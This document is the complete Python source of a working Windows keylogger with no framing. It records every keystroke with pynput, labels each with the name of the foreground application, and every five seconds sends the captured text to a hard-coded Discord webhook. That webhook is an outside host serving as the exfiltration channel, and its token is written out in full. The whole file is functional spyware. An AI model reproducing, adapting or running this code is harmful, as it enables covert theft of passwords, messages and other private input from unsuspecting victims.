import ctypes
import requests
import threading
import time
from pynput import keyboard

# === CONFIG ===
WEBHOOK = "https://discord.com/api/webhooks/1396489430990196866/m0ocO7FF7aqQJc8sRCfJcPaFcQCXDmrrpFi3CTmAv76OqxaBf4o1oO3sKrbYCOO-eW0S"
SEND_INTERVAL = 5  # seconds

# === STATE ===
shift_pressed = False
caps_on = False
buffer = []
lock = threading.Lock()

def get_app_name():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value.split(' - ')[-1][:25] or "Unknown"
    except:
        return "Unknown"

def send_buffered_keys():
    while True:
        time.sleep(SEND_INTERVAL)
        with lock:
            if buffer:
                grouped = {}
                for key, app in buffer:
                    if app not in grouped:
                        grouped[app] = ""
                    grouped[app] += key

                content = f"📥 **Captured Keys ({time.strftime('%H:%M:%S')})**\n"
                for app, text in grouped.items():
                    content += f"**{app}**:\n`{text}`\n\n"

                try:
                    requests.post(WEBHOOK, json={"content": content.strip()}, timeout=2)
                except:
                    pass
                buffer.clear()

def on_press(key):
    global shift_pressed, caps_on

    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = True
        return
    elif key == keyboard.Key.caps_lock:
        caps_on = not caps_on
        return

    app = get_app_name()

    try:
        char = key.char
        if char:
            if (shift_pressed or caps_on) and char.isalpha():
                char = char.upper()
            with lock:
                buffer.append((char, app))
    except:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]"
        }
        display = special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")
        with lock:
            buffer.append((display, app))

def on_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False

# === START ===
threading.Thread(target=send_buffered_keys, daemon=True).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
